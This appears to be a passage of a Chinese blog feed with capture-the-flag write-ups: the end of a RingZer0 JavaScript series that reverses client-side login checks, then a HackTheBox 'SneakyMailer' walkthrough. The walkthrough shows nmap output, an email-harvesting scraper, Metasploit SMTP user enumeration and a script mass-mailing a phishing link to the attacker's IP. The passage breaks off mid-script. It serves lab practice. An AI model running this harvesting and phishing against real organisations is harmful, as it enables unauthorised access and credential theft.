class="string">'TBG8-Jjep-jM2L-KL23-Hr1A'</span>;</span><br><span class="line"><span class="keyword">var</span> input = key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;src.length; i++) &#123;</span><br><span class="line">p = dst.indexOf(src[i]);</span><br><span class="line">tmp = input.split(<span class="string">''</span>);</span><br><span class="line">tmp[p] = key[i];</span><br><span class="line">input = tmp.join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(input);</span><br></pre></td></tr></table></figure><p>得到key<code>ABGH-3jeK-LM2j-pL2J-8r1T</code></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Look's like weak JavaScript auth script :)</span></span><br><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">var</span> k = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>);</span><br><span class="line">    <span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> t = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(u == <span class="string">"administrator"</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; u.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>((u.charCodeAt(i) + p.charCodeAt(i) + i * <span class="number">10</span>) != k[i]) &#123;</span><br><span class="line">                $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">                t = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">        t = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(t) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>相比上一题算是小菜了。用户输入密码的ascii会与用户名administrator进行加法运算并与已知数组值进行比较。那么逆写即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">k = [<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>]</span><br><span class="line">u = [<span class="number">97</span>,<span class="number">100</span>,<span class="number">109</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">114</span>]</span><br><span class="line">p = &#123;&#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">"administrator"</span></span><br><span class="line">list1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s)):</span><br><span class="line">    p[i] = k[i] - u[i] - i*<span class="number">10</span></span><br><span class="line">    list1.append(p[i])</span><br><span class="line">    </span><br><span class="line">print(<span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> list1))</span><br></pre></td></tr></table></figure><p>得到<code>OhLord4309111</code></p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Look's like weak JavaScript auth script :)</span></span><br><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">var</span> u = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> k = $(<span class="string">"#cuser"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> func = <span class="string">"\x2B\x09\x4A\x03\x49\x0F\x0E\x14\x15\x1A\x00\x10\x3F\x1A\x71\x5C\x5B\x5B\x00\x1A\x16\x38\x06\x46\x66\x5A\x55\x30\x0A\x03\x1D\x08\x50\x5F\x51\x15\x6B\x4F\x19\x56\x00\x54\x1B\x50\x58\x21\x1A\x0F\x13\x07\x46\x1D\x58\x58\x21\x0E\x16\x1F\x06\x5C\x1D\x5C\x45\x27\x09\x4C\x1F\x07\x56\x56\x4C\x78\x24\x47\x40\x49\x19\x0F\x11\x1D\x17\x7F\x52\x42\x5B\x58\x1B\x13\x4F\x17\x26\x00\x01\x03\x04\x57\x5D\x40\x19\x2E\x00\x01\x17\x1D\x5B\x5C\x5A\x17\x7F\x4F\x06\x19\x0A\x47\x5E\x51\x59\x36\x41\x0E\x19\x0A\x53\x47\x5D\x58\x2C\x41\x0A\x04\x0C\x54\x13\x1F\x17\x60\x50\x12\x4B\x4B\x12\x18\x14\x42\x79\x4F\x1F\x56\x14\x12\x56\x58\x44\x27\x4F\x19\x56\x49\x16\x1B\x16\x14\x21\x1D\x07\x05\x19\x5D\x5D\x47\x52\x60\x46\x4C\x1E\x1D\x5F\x5F\x1C\x15\x7E\x0B\x0B\x00\x49\x51\x5F\x55\x44\x31\x52\x45\x13\x1B\x40\x5C\x46\x10\x7C\x38\x10\x19\x07\x55\x13\x44\x56\x31\x1C\x15\x19\x1B\x56\x13\x47\x58\x30\x1D\x1B\x58\x55\x1D\x57\x5D\x41\x7C\x4D\x4B\x4D\x49\x4F"</span>;</span><br><span class="line">    buf = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (k.length == <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; func.length; i++) &#123;</span><br><span class="line">            c = <span class="built_in">parseInt</span>(func.charCodeAt(i));</span><br><span class="line">            c = c ^ k.charCodeAt(j);</span><br><span class="line">            <span class="keyword">if</span> (++j == k.length) &#123;</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            buf += <span class="built_in">eval</span>(<span class="string">'"'</span> + a(x(c)) + <span class="string">'"'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">eval</span>(buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">h</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (h.length != <span class="number">2</span>) &#123;</span><br><span class="line">        h = <span class="string">"\x30"</span> + h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"\x5c\x78"</span> + h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (d &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        d = <span class="number">0xFFFFFFFF</span> + d + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d.toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里代码流程也比较复杂。简单概括就是去username作为输入然后每9个字符与所给的func进行异或。最后结果会转hex.</p><p>虽然我们不知道需要的username明文，但是可以利用<code>a^b=c =&gt; a^c=b</code>这点，猜测密文中可能会存在跟前面的出flag一致的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>所以我们简单爆破下username并进行内容筛选，找出有document出现的结果<br>这里借用另一位师傅的脚本<a href="https://github.com/NotSurprised/RingZer0-CTF-Writeup/blob/master/JavaScript/07.%20Why%20not%20be%20more%20secure/Why%20not%20be%20more%20secure.md" target="_blank" rel="noopener">https://github.com/NotSurprised/RingZer0-CTF-Writeup/blob/master/JavaScript/07.%20Why%20not%20be%20more%20secure/Why%20not%20be%20more%20secure.md</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="string">"\x2B\x09\x4A\x03\x49\x0F\x0E\x14\x15\x1A\x00\x10\x3F\x1A\x71\x5C\x5B\x5B\x00\x1A\x16\x38\x06\x46\x66\x5A\x55\x30\x0A\x03\x1D\x08\x50\x5F\x51\x15\x6B\x4F\x19\x56\x00\x54\x1B\x50\x58\x21\x1A\x0F\x13\x07\x46\x1D\x58\x58\x21\x0E\x16\x1F\x06\x5C\x1D\x5C\x45\x27\x09\x4C\x1F\x07\x56\x56\x4C\x78\x24\x47\x40\x49\x19\x0F\x11\x1D\x17\x7F\x52\x42\x5B\x58\x1B\x13\x4F\x17\x26\x00\x01\x03\x04\x57\x5D\x40\x19\x2E\x00\x01\x17\x1D\x5B\x5C\x5A\x17\x7F\x4F\x06\x19\x0A\x47\x5E\x51\x59\x36\x41\x0E\x19\x0A\x53\x47\x5D\x58\x2C\x41\x0A\x04\x0C\x54\x13\x1F\x17\x60\x50\x12\x4B\x4B\x12\x18\x14\x42\x79\x4F\x1F\x56\x14\x12\x56\x58\x44\x27\x4F\x19\x56\x49\x16\x1B\x16\x14\x21\x1D\x07\x05\x19\x5D\x5D\x47\x52\x60\x46\x4C\x1E\x1D\x5F\x5F\x1C\x15\x7E\x0B\x0B\x00\x49\x51\x5F\x55\x44\x31\x52\x45\x13\x1B\x40\x5C\x46\x10\x7C\x38\x10\x19\x07\x55\x13\x44\x56\x31\x1C\x15\x19\x1B\x56\x13\x47\x58\x30\x1D\x1B\x58\x55\x1D\x57\x5D\x41\x7C\x4D\x4B\x4D\x49\x4F"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor</span>(<span class="params">ori_chr, dst_chr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(ori_chr.charCodeAt() ^ dst_chr.charCodeAt());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; func.length; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        buffer += xor(key[i % <span class="number">9</span>], func[i])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">guess</span>(<span class="params">i, guesskey</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; guesskey.length; j++) </span><br><span class="line">    &#123;</span><br><span class="line">        key[(i+j) % <span class="number">9</span>] = xor(guesskey[j], func[i + j])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> key.join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; func.length - <span class="number">9</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line">    key = guess(i, <span class="string">'document.'</span>);</span><br><span class="line">    finalbuffer = decode(key);</span><br><span class="line">    <span class="keyword">if</span> (finalbuffer.indexOf(<span class="string">'document.location'</span>) != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i, key, finalbuffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/3.PNG" alt><br>拿到用户名密码</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>简单小结下，js的trick还是挺多的，不过这几道题接触到trick的层面很浅。真正CTF比赛中运用到弱类型之类的倒是比较有意思。而这些challenge更多的就是利用js来混淆视听之类的，所以老实说比较考验代码审计的耐心跟debug水平。<br>  这个平台的jail系列有时间会去做做。</p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-SneakyMailer</title>
      <link href="2020/07/16/hackthebox-SneakyMailer/"/>
      <url>2020/07/16/hackthebox-SneakyMailer/</url>
      
        <content type="html"><![CDATA[<p>SneakyMailer是自己在htb上完成的第30台靶机。因为特殊纪念意义加上涉及到一些很有意思的知识所以记录下。整体难度比较简单。</p><p>由于SneakyMailer还是active状态，所以我会给文章上锁直到靶机退役。<br>ps:已退役<br><img src="/2020/07/16/hackthebox-SneakyMailer/head.PNG" alt></p><a id="more"></a><ul><li>靶机ip： 10.10.10.197</li><li>攻击机： 10.10.14.87</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>首先上nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Mon Jul 13 10:04:34 2020 as: nmap -sC -sV -oA nmap/sneakymailer 10.10.10.197</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.197</span><br><span class="line">Host is up (0.41s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">21/tcp   open  ftp      vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)</span><br><span class="line">|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)</span><br><span class="line">|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:<span class="built_in">fc</span>:1a (ED25519)</span><br><span class="line">25/tcp   open  smtp     Postfix smtpd</span><br><span class="line">|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, </span><br><span class="line">80/tcp   open  http     nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Did not follow redirect to http://sneakycorp.htb</span><br><span class="line">143/tcp  open  imap     Courier Imapd (released 2018)</span><br><span class="line">|_imap-capabilities: ENABLE THREAD=ORDEREDSUBJECT UTF8=ACCEPTA0001 OK QUOTA SORT CHILDREN STARTTLS IMAP4rev1 THREAD=REFERENCES ACL2=UNION NAMESPACE ACL IDLE CAPABILITY completed UIDPLUS</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US</span><br><span class="line">| Subject Alternative Name: email:postmaster@example.com</span><br><span class="line">| Not valid before: 2020-05-14T17:14:21</span><br><span class="line">|_Not valid after:  2021-05-14T17:14:21</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">993/tcp  open  ssl/imap Courier Imapd (released 2018)</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US</span><br><span class="line">| Subject Alternative Name: email:postmaster@example.com</span><br><span class="line">| Not valid before: 2020-05-14T17:14:21</span><br><span class="line">|_Not valid after:  2021-05-14T17:14:21</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">8080/tcp open  http     nginx 1.14.2</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Mon Jul 13 10:05:43 2020 -- 1 IP address (1 host up) scanned in 68.86 seconds</span></span><br></pre></td></tr></table></figure><p>nmap得到结果有多个端口开放，其中不太常规的是25,143,993等端口。正如结果所示，这些端口都与邮件有关。其中25是smtp端口。143,993是imap的默认两个端口。其中一个是明文一个是ssl加密。</p><p>21ftp端口不能匿名登录。那我们先从80端口开始。开始一个跳转。所以我们需要把<code>sneakycorp.htb</code>加入到<code>/etc/hosts</code>中。web页面结果只有index.php与team.php存在。而team.php源码中存在几十个email.均是<code>xxx@sneakymailer.htb</code>形式。<br>果断先把mail收集起来。并且user跟mail各存一份</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://sneakycorp.htb/team.php'</span></span><br><span class="line">r=requests.get(url)</span><br><span class="line">mail=re.findall(<span class="string">r'&lt;td&gt;(.*)@sneakymailer.htb'</span>,r.text)</span><br><span class="line">f=open(<span class="string">'user.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mail:</span><br><span class="line"><span class="comment">#f.write(i+'\n')</span></span><br><span class="line">    f.write(i+<span class="string">'@sneakymailer.htb'</span>+<span class="string">'\n'</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后源码中提示了一个<code>pypi/register.php</code>。访问后似乎可以提供注册功能。但是根据简单的几个demo感觉还是个静态文件。因为假如再次输入密码跟原密码不一致它也没有进行任何报错。那么我有理由怀疑整个网站都静态的。</p><p>既然如此只能从几个邮件服务器入手enum了。这里我先去了解了下<code>smtp</code>,<code>imap</code>的相关信息以及常见漏洞。简单概括如下：</p><ul><li>smtp主要用于发送邮件。imap主要用于接收邮件</li><li>smtp/imap server 均可使用 telnet,nc进行连接</li><li>smtp可以在不登录的情况下进行username的枚举。imap必须登录才能进行接下来的查看邮件信息等操作</li></ul><p>并且两种服务基本上不存在可以直接利用的漏洞。看来是要进行信息枚举了。<br>首先从25端口开始。前面提到了。针对smtp的enum主要就只有用户名的enum.我们无法进行进一步的利用。<br>这篇<a href="https://www.hackingarticles.in/4-ways-smtp-enumeration/" target="_blank" rel="noopener">文章</a>讲的非常全面。我也基本上先按照这个流程来。比如首先进行手动测试<code>VRFY root</code>。得到252.说明root用户是在机器上的。不过经过前面nmap的探测,似乎能使用的smtp命令非常局限。看来我们只能从<code>VRFY</code>下手了。</p><p>这里使用msf的模块进行enum,具体方法参考上面文章。其实之前使用了smtp-user-enum。但似乎存在问题,没有得到我想要的结果。换了msf的模块就好了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smtp/smtp_enum) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)</span><br><span class="line">[+] 10.10.10.197:25       - 10.10.10.197:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb</span><br><span class="line">[*] 10.10.10.197:25       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>看起来我们得到的邮箱都是有效的……到这一步就很难进一步进行发展了。因为smtp的利用最多到枚举用户名。imap与ftp又需要用户密码。8080端口跑着一个似乎裸的nginx.顿时少了思路</p><p>去论坛逛了一圈。发现大家提到了钓鱼的说法。难不成是要发送邮件？简单搜索了下发现python支持我们调用smtp服务器进行email的发送。那就按照菜鸟教程的脚本改改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"> </span><br><span class="line">sender = <span class="string">'byc@bycsec.top'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'mail.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    receivers = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">message = MIMEText(<span class="string">'http://10.10.14.87'</span>, <span class="string">'plain'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">message[<span class="string">'From'</span>] = Header(<span class="string">"byc"</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">message[<span class="string">'To'</span>] =  Header(<span class="string">"aaa"</span>, <span class="string">'utf-8'</span>)     </span><br><span class="line"> </span><br><span class="line">subject = <span class="string">'Sth Really Helpful'</span></span><br><span class="line">message[<span class="string">'Subject'</span>] = Header(subject, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    smtpObj = smtplib.SMTP(<span class="string">'10.10.10.197'</span>,<span class="number">25</span>)</span><br><span class="line">    smtpObj.sendmail(sender, receivers, message.as_string())</span><br><span class="line">    print(<span class="string">"[*] success"</span>)</span><br><span class="line"><span class="keyword">except</span> smtplib.SMTPException:</span><br><span class="line">    print(<span class="string">"[*] 